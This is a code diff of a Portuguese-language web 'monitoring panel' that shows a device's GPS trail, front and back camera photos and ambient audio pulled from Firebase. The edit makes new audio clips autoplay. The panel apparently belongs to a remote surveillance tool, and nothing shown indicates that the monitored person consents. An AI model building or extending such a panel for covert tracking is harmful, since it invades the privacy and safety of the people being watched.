@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEW-NEXOS // PAINEL DE MONITORAMENTO</title>
+    <title> NEW NEXOS // PAINEL DE MONITORAMENTO</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
@@ -76,9 +76,7 @@
             </div>
             <div class="audio-section">
                 <h3>🎤 Áudio Ambiente</h3>
-                <audio id="audioPlayer" class="audio-player" controls>
-                    <source src="" type="audio/wav">
-                </audio>
+                <audio id="audioPlayer" class="audio-player" controls autoplay></audio>
             </div>
             <div class="cameras-row">
                 <div class="cam-card"><div class="cam-card-title">🎥 Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront"></div></div>
@@ -126,7 +124,6 @@
                         if (pontos.length > 100) pontos.shift();
                         linha.setLatLngs(pontos);
                     }
-                    // Fotos
                     if (data.photo_front && data.photo_front.length > 100) {
                         document.getElementById('labelFront').style.display = 'none';
                         document.getElementById('imgFront').src = 'data:image/jpeg;base64,' + data.photo_front;
@@ -137,9 +134,12 @@
                         document.getElementById('imgBack').src = 'data:image/jpeg;base64,' + data.photo_back;
                         document.getElementById('imgBack').style.display = 'block';
                     }
-                    // Áudio
                     if (data.audio && data.audio.length > 100) {
-                        document.getElementById('audioPlayer').src = 'data:audio/wav;base64,' + data.audio;
+                        const audioPlayer = document.getElementById('audioPlayer');
+                        if (audioPlayer.src.indexOf(data.audio.substring(0, 50)) === -1) {
+                            audioPlayer.src = 'data:audio/wav;base64,' + data.audio;
+                            audioPlayer.play().catch(() => {});
+                        }
                     }
                 } else {
                     document.getElementById('errorBox').style.display = 'block';
